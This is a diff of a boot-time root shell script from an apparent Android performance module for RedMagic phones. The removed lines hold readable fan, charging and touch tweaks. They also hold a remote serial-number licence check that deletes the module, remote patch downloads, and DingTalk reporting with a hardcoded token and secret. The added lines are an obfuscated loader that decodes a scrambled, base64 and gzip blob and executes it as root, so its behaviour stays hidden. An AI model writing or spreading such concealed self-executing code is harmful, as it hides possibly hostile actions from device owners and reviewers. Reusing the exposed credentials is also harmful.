@@ -1,304 +1,99 @@
 #!/system/bin/sh
-
 MODDIR=${0%/*}
-echo $$ > "$MODDIR/.svc_pid" 2>/dev/null
-MYST=$(awk '{print $22}' /proc/$$/stat 2>/dev/null)
-[ -n "$MYST" ] && for p in $(ps -A -o pid,args 2>/dev/null | grep '[s]ervice.sh' | awk '{print $1}'); do
-  [ "$p" = "$$" ] && continue
-  PT=$(awk '{print $22}' /proc/$p/stat 2>/dev/null)
-  [ -n "$PT" ] && [ "$PT" -lt "$MYST" ] && kill -9 "$p" 2>/dev/null
-done
-mkdir -p /sdcard/FanExtreme 2>/dev/null
-CONFIG="$MODDIR/config.txt"
-
-#加载功能库
-. "$MODDIR/lib/common.sh"
-. "$MODDIR/lib/whitelist.sh"
-. "$MODDIR/lib/patch.sh"
-. "$MODDIR/lib/ding.sh"
-. "$MODDIR/lib/features.sh"
-. "$MODDIR/lib/status.sh"
-. "$MODDIR/lib/perf.sh"
-. "$MODDIR/lib/loop.sh"
-
-#授权检测
-SERIAL=$(getprop ro.serialno 2>/dev/null)
-WHITELIST_RAW="https://raw.githubusercontent.com/ling9ling7/RedMagic-FanExtreme/main/whitelist.txt"
-WHITELIST_PROXY="https://ghfast.top/https://raw.githubusercontent.com/ling9ling7/RedMagic-FanExtreme/main/whitelist.txt"
-LICENSED_FILE="$MODDIR/.licensed"
-
-
-if [ ! -f "$LICENSED_FILE" ]; then
-  whitelist_check "$SERIAL"
-  case $? in
-    0)
-      echo "$SERIAL" > "$LICENSED_FILE"
-      ;;
-    1)
-      echo "[$(date +%F_%T)] unauthorized, removing module" > "$MODDIR/.last_error" 2>/dev/null
-      rm -rf "$MODDIR"
-      for p in $(ps -A -o pid,args 2>/dev/null | grep '[s]ervice.sh' | awk '{print $1}'); do
-        kill -9 "$p" 2>/dev/null
-      done
-      exit 0
-      ;;
-  esac
-  if [ ! -f "$LICENSED_FILE" ]; then
-    (
-      while [ ! -f "$LICENSED_FILE" ]; do
-        sleep 300
-        whitelist_check "$SERIAL"
-        case $? in
-          0)
-            echo "$SERIAL" > "$LICENSED_FILE"
-            ;;
-          1)
-            echo "[$(date +%F_%T)] unauthorized, removing module" > "$MODDIR/.last_error" 2>/dev/null
-            rm -rf "$MODDIR"
-            for p in $(ps -A -o pid,args 2>/dev/null | grep '[s]ervice.sh' | awk '{print $1}'); do
-              kill -9 "$p" 2>/dev/null
-            done
-            exit 0
-            ;;
-        esac
-      done
-    ) &
-  fi
-fi
-
-#热补丁
-PATCH_RAW_DIR="https://raw.githubusercontent.com/ling9ling7/RedMagic-FanExtreme/main/patches"
-PATCH_PROXY_DIR="https://ghfast.top/https://raw.githubusercontent.com/ling9ling7/RedMagic-FanExtreme/main/patches"
-PATCH_LOG="$MODDIR/.patch_log"
-APPLIED_FILE="$MODDIR/.applied"
-CHECK_NOW="$MODDIR/.check_now"
-
-
-
-ERRLOG="$MODDIR/.last_error"
-
-:> "$ERRLOG"
-
-#验证成功回传
-DING_TOKEN="c0c98f109106777162fcf7b2326400b83096b8fbd523f0b217fd82b9ea78e1ba"
-DING_SECRET="SECc61774a65828482beb80e0a0c54de94012f16d690c01ccc0a2a2d2d83ebfd1c1"
-DING_DONE="$MODDIR/.ding_done"
-
-
-
-(
-    sleep 60
-    ding_report
-    while true; do
-        sleep 3600
-        [ -f "$DING_DONE" ] || ding_report
-    done
-) &
-
-
-#路径自适应
-FAN_LEVEL=/sys/kernel/fan/fan_speed_level
-FAN_ENABLE=/sys/kernel/fan/fan_enable
-if [ ! -e "$FAN_LEVEL" ] && [ -e /sys/kernel/fan_speed_level ]; then
-  FAN_LEVEL=/sys/kernel/fan_speed_level
-  FAN_ENABLE=/sys/kernel/fan_enable
-fi
-GPU_MAX_CLOCK=/sys/kernel/gpu/gpu_max_clock
-GPU_MIN_CLOCK=/sys/kernel/gpu/gpu_min_clock
-GPU_FREQ_TABLE=/sys/kernel/gpu/gpu_freq_table
-if [ ! -e "$GPU_MAX_CLOCK" ] && [ -e /sys/kernel/gpu_max_clock ]; then
-  GPU_MAX_CLOCK=/sys/kernel/gpu_max_clock
-  GPU_MIN_CLOCK=/sys/kernel/gpu_min_clock
-  GPU_FREQ_TABLE=/sys/kernel/gpu_freq_table
-fi
-
-
-if [ "$(cfg '风扇极速')" = "1" ]; then
-    fan_extreme
-fi
-
-if [ "$(cfg '充电加速')" = "1" ]; then
-    for i in $(seq 1 15); do
-        [ -e /sys/class/qcom-battery/restrict_cur ] && break
-        sleep 1
-    done
-    if [ "$(settings get global charge_separation_switch 2>/dev/null)" != "1" ] && [ "$(cat /sys/class/qcom-battery/charging_enabled 2>/dev/null)" != "0" ] && [ "$(cat /sys/class/qcom-battery/battery_charging_enabled 2>/dev/null)" != "0" ]; then
-      echo 0 > /sys/class/qcom-battery/restrict_cur 2>>"$ERRLOG"
-      echo 0 > /sys/class/qcom-battery/restrict_chg 2>>"$ERRLOG"
-      echo 1 > /sys/class/qcom-battery/charging_enabled 2>>"$ERRLOG"
-      echo 1 > /sys/class/qcom-battery/battery_charging_enabled 2>>"$ERRLOG"
-      [ -e /sys/class/qcom-battery/screen_is_on ] && echo 0 > /sys/class/qcom-battery/screen_is_on 2>/dev/null
-    fi
-fi
-
-
-if [ "$(cfg '云控屏蔽')" = "1" ]; then
-    block_cloud_control
-fi
-
-
-
-if [ "$(cfg '振动增强')" = "1" ]; then
-    vibe_boost
-fi
-
-
-if [ "$(cfg '温控移除')" = "1" ]; then
-    remove_thermal
-else
-    rm -f "$MODDIR/vendor/etc/thermal-engine.conf"
-fi
-
-
-AUTO_TOUCH_FILE="$MODDIR/auto_touch"
-TOUCH_MODE_FILE="$MODDIR/touch_mode"
-TOUCH_APPS_FILE="$MODDIR/touch_apps"
-
-if [ "$(cfg '触控优化')" = "1" ]; then
-    touch_boost
-    (
-      while true; do
-        sleep 60
-        [ -f "$AUTO_TOUCH_FILE" ] && { [ ! -f "$TOUCH_MODE_FILE" ] || [ "$(cat "$TOUCH_MODE_FILE")" != "perapp" ]; } && touch_boost
-      done
-    ) &
-    inotifyd - /sys/class/backlight/panel0-backlight/brightness:c | while read -r f; do
-        [ -f "$AUTO_TOUCH_FILE" ] && { [ ! -f "$TOUCH_MODE_FILE" ] || [ "$(cat "$TOUCH_MODE_FILE")" != "perapp" ]; } && touch_boost
-    done &
-fi
-
-if [ "$(cfg '亮度解锁')" = "1" ]; then
-    brightness_unlock
-fi
-
-#触控按应用模式
-(
-  while true; do
-    if [ -f "$AUTO_TOUCH_FILE" ] && [ -f "$TOUCH_MODE_FILE" ] && [ "$(cat "$TOUCH_MODE_FILE")" = "perapp" ]; then
-      pkg=$(dumpsys activity activities 2>/dev/null | grep -m1 "topResumedActivity" | grep -o "[a-z][a-z0-9_.]*/" | head -1 | tr -d "/")
-      matched=0
-      if [ -n "$pkg" ] && [ -f "$TOUCH_APPS_FILE" ] && grep -qx "$pkg" "$TOUCH_APPS_FILE" 2>/dev/null; then
-        matched=1
-      fi
-      if [ "$matched" = "1" ]; then
-        if [ ! -f "$MODDIR/.touch_active" ]; then
-          touch_boost
-          touch "$MODDIR/.touch_active"
-        fi
-      else
-        if [ -f "$MODDIR/.touch_active" ]; then
-          [ -e /proc/touchscreen/tp_report_rate ] && { echo 1 > /proc/touchscreen/tp_report_rate; echo 0 > /proc/touchscreen/play_game; echo 1 > /proc/touchscreen/follow_hand_level; }
-          settings delete system touch_sampling_rate 2>/dev/null
-          rm -f "$MODDIR/.touch_active"
-        fi
-      fi
-    fi
-    sleep 1
-  done
-) &
-
-#WebUI
-WEBUI_CMD="$MODDIR/webui_cmd"
-WEBUI_STATUS="$MODDIR/webui_status"
-THRESHOLD_FILE="$MODDIR/threshold"
-OLD_THRESHOLD="/sdcard/FanExtreme/threshold"
-AUTO_CHARGE_FILE="$MODDIR/auto_charge"
-AUTO_FAN_FILE="$MODDIR/auto_fan"
-FAN_SCREEN_OFF_FILE="$MODDIR/auto_fan_screen_off"
-FAN_WAS_ON_FILE="$MODDIR/.fan_was_on"
-TEMP_CTRL_FILE="$MODDIR/auto_temp_control"
-TEMP_CTRL_MODE_FILE="$MODDIR/temp_control_mode"
-TEMP_CTRL_THRESHOLD_FILE="$MODDIR/temp_control_threshold"
-PUMP_TEMP_CTRL_FILE="$MODDIR/auto_pump_temp_control"
-PUMP_TEMP_CTRL_MODE_FILE="$MODDIR/pump_temp_control_mode"
-PUMP_TEMP_CTRL_THRESHOLD_FILE="$MODDIR/pump_temp_control_threshold"
-AUTO_PUMP_FILE="$MODDIR/auto_pump"
-PUMP_SCREEN_OFF_FILE="$MODDIR/auto_pump_screen_off"
-PUMP_WAS_ON_FILE="$MODDIR/.pump_was_on"
-AUTO_PERF_FILE="$MODDIR/perf_enabled"
-PERF_BACKUP="$MODDIR/perf_backup"
-PERF_PENDING="$MODDIR/perf_pending"
-PERF_TARGET="$MODDIR/perf_target"
-
-rm -f "$PERF_PENDING" "$PERF_BACKUP" "$PERF_TARGET" 2>/dev/null
-[ "$(cfg '充电分离')" = "1" ] && touch "$AUTO_CHARGE_FILE" 2>/dev/null
-[ "$(cfg '风扇极速')" = "1" ] && touch "$AUTO_FAN_FILE" 2>/dev/null
-[ "$(cfg '触控优化')" = "1" ] && touch "$AUTO_TOUCH_FILE" 2>/dev/null
-[ "$(cfg '振动增强')" = "1" ] && touch "$MODDIR/auto_vibe" 2>/dev/null
-if [ -e /proc/driver/micropump/speed ]; then
-  touch "$MODDIR/auto_pump" 2>/dev/null
-else
-  case "$(getprop ro.product.model)" in NX[89]*) touch "$MODDIR/auto_pump" 2>/dev/null;; esac
-fi
-tcfg=$(cfg "充电分离阈值")
-[ -s "$THRESHOLD_FILE" ] || { [ -n "$tcfg" ] && echo "$tcfg" > "$THRESHOLD_FILE" 2>/dev/null; }
-[ -f "$OLD_THRESHOLD" ] && [ ! -f "$THRESHOLD_FILE" ] && cp "$OLD_THRESHOLD" "$THRESHOLD_FILE" 2>/dev/null
-
-
-PERF_KILL_PID=""
-
-
-
-
-
-
-
-
-
-
-
-
-webui_loop &
-
-#充电分离监控
-if [ "$(cfg '充电分离')" = "1" ]; then
-  (
-    while true; do
-      if [ -f "$AUTO_CHARGE_FILE" ]; then
-        threshold=$(cat "$THRESHOLD_FILE" 2>/dev/null)
-        [ -z "$threshold" ] && threshold=$(cfg "充电分离阈值")
-        [ -z "$threshold" ] && threshold=100
-        local_info=$(dumpsys battery 2>/dev/null)
-        [ -z "$local_info" ] && sleep 3 && continue
-        level=$(echo "$local_info" | grep 'level:' | head -1 | tr -d ' ' | cut -d: -f2)
-        ac=$(echo "$local_info" | grep 'AC powered:' | head -1 | awk '{print $3}')
-        usb=$(echo "$local_info" | grep 'USB powered:' | head -1 | awk '{print $3}')
-        wireless=$(echo "$local_info" | grep 'Wireless powered:' | head -1 | awk '{print $3}')
-        if [ "$level" -ge "$threshold" ] && { [ "$ac" = "true" ] || [ "$usb" = "true" ] || [ "$wireless" = "true" ]; }; then
-          current=$(settings get global charge_separation_switch 2>/dev/null)
-          if [ "$current" != "1" ]; then
-            settings put global charge_separation_switch 1
-          fi
-        fi
-        sleep 3
-      else
-        sleep 3
-      fi
-    done
-  ) &
-fi
-
-#充电加速维护
-if [ "$(cfg '充电加速')" = "1" ]; then
-  (
-    while true; do
-      if [ "$(settings get global charge_separation_switch 2>/dev/null)" = "1" ] || [ "$(cat /sys/class/qcom-battery/charging_enabled 2>/dev/null)" = "0" ] || [ "$(cat /sys/class/qcom-battery/battery_charging_enabled 2>/dev/null)" = "0" ]; then
-        sleep 5
-        continue
-      fi
-      echo 0 > /sys/class/qcom-battery/restrict_cur 2>/dev/null
-      echo 0 > /sys/class/qcom-battery/restrict_chg 2>/dev/null
-      echo 1 > /sys/class/qcom-battery/charging_enabled 2>/dev/null
-      echo 1 > /sys/class/qcom-battery/battery_charging_enabled 2>/dev/null
-      [ -e /sys/class/qcom-battery/screen_is_on ] && echo 0 > /sys/class/qcom-battery/screen_is_on 2>/dev/null
-      sleep 30
-    done
-  ) &
-fi
-
-touch_firmware
-
-#主进程常驻
-while true; do
-  sleep 30
-done
+export MODDIR
+T=/dev/tmp
+mkdir -p $T || T=/data/local/tmp
+F=$T/fex.$$
+L=$(grep -n '^#__FEX__$' "$0" | tail -n 1 | cut -d: -f1)
+[ -z "$L" ] && exit 0
+tail -n +$((L+1)) "$0" | tac | tr 'qEMUDCJp5nAI23r0aoZ8VS1efN7vyLu96+xkBWTtFjKG4lwbm=dizYhcg/QOPHRsX' 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' > "$F.b"
+base64 -d "$F.b" | gzip -d > "$F.s"
+[ -s "$F.s" ] || { rm -f "$F.b" "$F.s"; exit 0; }
+rm -f "$F.b"
+exec sh "$F.s"
+exit 0
+#__FEX__
+9B/isf/GLWLzcfNGg9=GHWwbku2KBb=vLCw8Ps6MEhEOZP0znxuK+d4/ggQtzTWsqZOkGUCi0mqq
+dO1CKepETsG5Iv+Fd/Dugt3gNQEu4JJRGDWO1Nk/LKcVA2RnIfCbhDT3JKWeaeeCoTjopi1ZP0YI
+MMeVJr5MHNHoDC1knBP41H6iq4HCkdrK=vpPbZGQ2mm0hRa1/iLwsmtfBlHbDAoneiMcGCquwRpW
+UZeeavGnOZHQhVTvkeoYULJOUWk0fDgLu3mHChOl+0/634OUsf9eotjxBklebkPvPi2rL1czc2Aj
+aJgzn1J0JQw5GSZ+SzvZCjK9H57fflKJ5/8p9ryHBPNB5490rQw/RRbx0aowaRIyQDxM6toGEySi
+/07iT/PhyieT2DPhlO7VcyYYylr5jo=d/qf/KQ+OBGec15Si/ycU83T7PF+4doDpGW/yGnv8tOGu
+pFqDuBmrBKkBlOsHRyVpezGzlhfRAo/Zix+ulKqptUqs9ohL0eWa2U3SLN=eu5jrE9rgbFtAh3ix
+=8n3WUjzUQATnzH2ier5yyxz4ZABTdABYUo8ZpBwgQLejSLUQwo2Mhzs0Yj79kC9b=GwWoe1VFVq
+=YPNFt8IIGuvs0W0bsG48znTkhwUADBIpW7JKTovTz2Su1DNtjAx2FLpGEwA2NeVPM5Tz8+5aNHJ
+4W+nwiPK+6DvqexgwbvByUyUmK/wyfkLskvj3ToqeAkYdDDk6iB6CthaqaT52aLZnenGDN4V919G
++ZjrDFZhum6iNYITaK82BnuNSDEkv+5t3Urik3GPHAduA75Z7bBd4cS5W=MSZryV7/pMoTjBds9c
+vpHvhLtfAqC8uMcxJq7vP1=YeHtn5TzZdErSYMbqvssjGGnh4ILSTnc==5zKDEJzACDIFCJRkwCI
+ZUA0HsGOkcuh4jbyfDawAiF1FMJU2S+0dbPraqZT518lPuGuFc/osT0Cnmyk1/PMJAxhnvjehgyL
+HL1n7HC3MxJRuDuuZZuex8WHBZrjHrAHiO0RmP33Nucjuj5y8bq63ESlqll83Gjs4pjmwnPCfEY8
+mrVCbwAob8lc4xaNekn+oy+LrSUeVBRSF8KnF5FoJF/WrZ9AZIS/6o/LDuv+2MKtLJ=+FnEL7uVx
+A/BuNGoQrcw=+Awvk=Ljr57QBfja8ogyxJ=m96fKPAkg7oT1JMgTIHem8witKkZmWDabGY3aWWIB
+eR1iBF41Nrrt3l/saS/7k11WR1nu8+Pa4E2LZN7x8urDv6ezexlc1/yuCraCD04kp=ZwDlDNEeqM
+882BgnxGCMFQraFw/brFW29zzVzEkhB1+VU3wbHQrpCENVkSqt3AujcP6YWdDUEj5mWhqebfUdLf
+ZP/TIe2gMKUf6=ia7xa0E+//4OpbLOey77doky=sVcvj4uOlqj9QmPVetccHR7Lb0s/nxVbC0MK+
+d7fdAuecqMejuZJetU32ylyRZifoJafWFycpRb=NqrOo4CzpbWkUTAU2zj4G8Mp1hV/6JKyQ7F6T
+6=Y5/fLaSQ8IEK6spZSmalAyfw2mz2PqzeJC3qmx5A+EH6wEFqG=j8Z9ecsRJ9U//dHsusJGc=8i
+rpQatsipsm5ZbbGP8hssR8RInHrMDMbmcNwFSxSwQJorTK9fY+Y0=FDTyHqJlBDEwDTwrzjBgLeU
+jEiBiYsPm/l99cO=0=HHs9psCib56I6myuoaSz6KH=mG+Re3GsOOgjusbsx08dQRsA5fdHayfJe6
+2cPTYfn49xSjL+gPZDImloJ2+KV5hk2aCIEY9ZaiNnoU3lrQ92cUhCN2ecC4gNGUIqTBjTaIUYft
+63sgM5jv3IZy61F+vao/MM4RLW10SbxA9hAZPPvzSbwJyABFO4RSDVW=D6LWnK4egJjLCoLsSQQ5
+P5l9sK/P3KaUBQVUpOHDvZxHzmDHBobvUOQDr375HFJBQuQNJK8ezJ3xpt+fp1yPKnzR65gFHpDa
+ohMCa/f=5iUM52lNDLBqu9Iu=j=TUCplO7us9brItOc//MLb0sxc1khR8Z3BZKF2CBEd4dPRsEUK
+tdlG1ilG8YnmaiyB9mGVLfjTrLKfm1/wig5YvaChfQssqRV6ozqDvpkgjoIBnnrxKDmQAy5Dhy=B
+VcmefYh+CoACOJRb06oWCFCx1=Yfr2/ijn7nyyu3MtxyTZ4w5y8eVGnZnUJgfK5x64U=pwzuABHe
+x/xnSJJo+21JE1NLaxRWB6ZNmql=V8=NDqnAVfPql6+N+3oqxeCwGJgG1sz9HGLQlAoTSNo4KUv/
+Y5eOZ/hWumMAEz4lcCnvhbYOrWQRYhjck07MbGUyzWjl8L377B9lQEYHQZguJpjv7cr2nDyIi3UM
+M=YU2=fptvwL+ewlYTUjvTl/fvEBU08OtvlJ7HEjI=GQVTumk3eCnLmuKEmvAgE6yHn9z=v7xgbc
+JNkWUA1Ah35V5rIi49kgZ=xBeKEqQZLSRtlO7LZMNS1Q=raf+ConZKMujI1z/Z1kcSjwl=f1C=9v
+wmk8HhyS2hckGh5+SOA8tIVVhD=rTDIlJ2RDU2KQ00qsLyOOeVSqhWbMbW8npEjskODb4R81iK0y
+h1W44lJ0R5RhgICmurQsBKfaTw3818lx=6dErlsMm3ILSxlR2BbkawJSQncH7HS83yYSvZEWMu=9
+Pe2gv+clRwil0=oIf8Ed003HzkVE+jzjZqA=ZWNApooUHqzV4DOpAHjeBhhmWOZNgwv0HcVDiC3h
+lVj1Jfg2Waq/GbdHIndKef1r2n6EY0uBJZmhNOrSvwd7T92PqJednLN5O70QvTa7GejQKPPEKVhB
+PscRcwvKYWVAx3aoVhIjttGZpnGEA5odCtbyAAkC1hM7dRoWVLOUr6Bl1xr=Dg+DV2Dt91nQVjf/
+jEE+/h4ZHkm3oMEY1i15ee=toz0J6c8J/hJ2+GUiOATo6Se5RLxtRHv2JUtsM6lpermNoyPl=cpj
+qiF7w49ZRetV0bII1wOcVu2/hlcN0zM3=z+7fPmzUFU+Ilw66N1Mwy4sH+Yvft4B5+TjHnxDEYxd
+wiHhKddBpLlOfDEL/BUpHjb9ssbCbs/8LzGvpWHsRwJv9sBMDEINpHl999dsvcshVvLAiuF1wbkd
+LQ50eo6TTd/4Ec8gAUBSufphlOlSciQhIiO/wgw0sKHvN7TWZk2D00cUIdORs+ROSNgNg2C00cii
+sBCuciZ/qoWoboteArA4rGCnZ+kjOLPT2F27CGNJqpwvfZMbAZh=OpWhIDcP57t9kQew4oZq5=/I
+ehRY1ExTd1yVEAg0kwuFGlBBM8SaGeC8yd7d/mdyq0NKlbQwK4CTYWyMNgm+Lqw/3L3gFM0Osv1H
+p82B1HUajfc8lqA/R89tqavn/JsCWRPz/h2sfCTkrT9/KJDWj1mhlA9VbzUdsxn/18Gt7MUN=D1c
+=h1itOIo7yj3hnoM8PtSjUJTS3ikdfbCyEvKZUH2YxiSEc3Y8GMtRMpN94BU3axmLdjGAWx=JNiT
+eFbLbaDrcD/BdK0k1pE2oWTSbK2jJRAC1Yo4nuZFIG2TJ6EdoKdQukg5nJ7f2ZxR2ku/zxVtQlUz
+GAZ+JaW/PE=6oJzMwFyEwqkV=KRMErmn/1OsDJcUg==4UBdDmIQK=SsJiIH816no3aKVtjnkwlSP
+0cm3W4mR23tg5epmKrPawiGpYjeW1kcNDEqNacziE+N2r/Sb/z2GP38/uwolRRD8s38yUHD+uZQl
+8C8QeTkvgMUyG4HfcBdCjDZNgdBGHWLcZuA6aufPDh9yPNUDTaBxTho523jfpuIMpTGUOD0WJF/3
+xjCZVc2JF1tj8ZOwnlZrJUm60/LvaeVwl3VnnGBxUz5zTwqhv826OyPTuSgq0Vc8qSqoCeW6ekFZ
+3US5UgWLq3fNZYMt=qFMEo/maA6D681+pkESdcvd9aaTHEambrw+Ck8jVID3Z49pcqxNG6GtzQpP
+fd6LsNZPDi9BJmqQMydJFNHJvByGKkWuZ0537us71HJQKnKB1KZB+9vfLB/4ZoaVWuvQitN9AMbt
+iveRHt/Z4mjmIyD8ZCHUaWqT4SjHgABhGLc+ie3fJ8sJt4YJ0yyn7pYbgZWODlIQ9VnxtWkKRc82
+6PVEpWHRoOOSuZ60S/qbpPbmuf3HO4TcOKOImYjBw+M=texiCYuEQ/bvk/ZUtZ9Hvvn4wTK3KRZl
+vL9KTfq3CrVlgAjB24L8HfDPHB37Pm/Msc86b0FhUnakbonGfBGgH+=REs=PDRj8jJuhl3WaoFCu
+nEP+427TuJmiym=P56VhxexVghIvHdhBUchF+0hohGTs6EKkx7FnfqzF2Web3M0h6uGk+ewN+YDn
+Fpj+GE2IWQ8ANfipQ8GC7k7o5/aK+nB7ejWEBj1D5F1V2fjbUTYuFBoCZwMiwl0pJBMibfa8EWJ6
+EUjzNofV2cgm+OadzDi52D=vozcVq29Ud26VyZ=aomCQfq+n+Qb8+SVJ+Wq6S2PJ=4hT9C/4cMiY
+uMqv1JpKEbdzsKf1eNvK5mwx=aOIuitOt1zVW/lDJVuWjxqfm6iN2ecuaN/k1a3SJ/ylms=8Ci70
+SlvE3QuKEfHyHLodSIh2VxOyfjDeWZvZuiyo=f5FydZ+eJgCfrxTyyG3gEKKNzV3k92dfCSWTxSB
+HDpilDGm4z8quMNePE=NFnYNjkRU5o/3AJ3i4DdHeJ9xrB56FVr1khrg8Ii3NAH2qIcymAf7hW6C
+Fxe2NQY3L0Q413mxKhNjxdAk34ziZx8DHctwZkDH6h1AJoBKQC3pfMb5Lzn0msgLAFmdtW3ByB7/
+/y=IT9opvAFQ=P3LAbYnSo+k4ixhY2oZxaCjdERvO+YBf=qS214dpgcVAug=tDSMFPZ5bAEVRBox
+Gf0QMh8qMxr5TEErIr4rPBHlUu4FB6+pdzItY4gk+Wr5/i8z9QL2qFbbxdmACfuflhMwVD0aviy6
+g+w6UawkifcHewYYUSfBL6K=Zd9d545xBKnxx63Spp35pZCJv9IHa8DE05EDWE=S/caYmrxL1=bA
+06C9iga1nDYVhiZqpjFfQ+BUFKpdE4rdwGwOlLW9SifhlsjZA4/hKZhT=wWip+2T4ueScklQORfI
+MfCjBv96YJV0sfMPzdHVO=5fDFVmIp1fTDJ8GVE4=4ZQ=n55f1ilyeslxvAHPddA2j04yzDAEM9/
+h6xDxEvbcdR6JFftzhoK4Z5ie2/uIoF8fWmyhMxhYEES8bQ=vlGUO3AnrvNxGufU/foDouA9Dt3e
+3kg+m4+AkaNfTn2+QISFVxr4QKkok6ECiLi2o0a7TeKJbqWmmwCkbvZNeF8nxGIo9QgFYSK2RGIn
+MPHPzOpepEccTbrYEMC2MMcyErLrrd8mKFVEhD403f=rYtkgCYZIMZL=VpSLAQYoWRBiTIxHq+77
+knSfoxbFtE3C1unZk1VVMyvUgC/um2SxrQ0ao9gF21BsLtqnMoJ6PREhJHzJIE3pSQvfgs2Nla/a
+CUR66Ku0fwJO2ga0QraKGCu6qZ/qWi3/5=A+AdSZaOecOGewLLJhDQq3nO8YJ6DHaHo+UCZO/L9F
+4YJIUilkoTBt3LKJV9Q=ViTbwJK6koaUBY9S0Bzjmy21zgAjmclpaTgx9J5fS0xOKmLGkgt6CSM=
+QceRB2Q+KbMgmAt3zKRbVaMdYSplhAlCnl3gRaFJ9SlxKMtOOoSBTEa997rAf8fUFHoKh+dc+g0a
+iTWBe62VhnxFG=KEMvdzriqnpBlNrZAdf0SLR4BzKE6HUyZ5eQ51uGJM6+JhQZqx3Cvt/jm=u6uY
+14xcqSlva6UZ7dCtUMHu8/AajPDGaECL+n/ClMCSticu0r+bvug9ApwGiQ8V6HhHtuysBGxyDuMF
+m228tqnuhHtuhpiVxOVqYEbT4ETPMKoA2YJrNa/67Un=vEM5SUBNTaJh8UHalEp1=t3YLq7B1gQT
+4a08UkJ2O4gBcZz6t1MB=rHJjEs=ImzGZ02z3Fpu=k5kaEZNOlxg2+tGjFy7IjnHeS2HeL/aO9QG
+yQQ0JKwFgZEfQFOKUeY=ItK3++/hVuc59gJHK7t+jkRKmL0VRwci1tzCQVgCFZ3f=/SaUHQK9Mc3
+Swejksf0ulV/H1Z27TuwNHFEKtfQ/iVBw/QkdL1KOqLK5DQjSg/amdNgf7KDeKUvl/p+u2+CjFhK
+qidoEQflRQ0Az/cYHyhHeb129u6hKTul1sIPReBC7d2pS7bFqNAKvCEwRW33yVYLajzp4FQt4+Y7
+PTCdv8N81iwSiSvliTNclT7deOAYpOfh3NtH3/CtsMsdR6UawM+jk4oWPVMs9bcwHsjYPRf3h8sY
+pg45qDR7xJFMsPVO7e0vdne9RZb72JhAJj267S4pS9ZVICJhdGABQ5xLBkmFDJxaMDDq=BCN5QlK
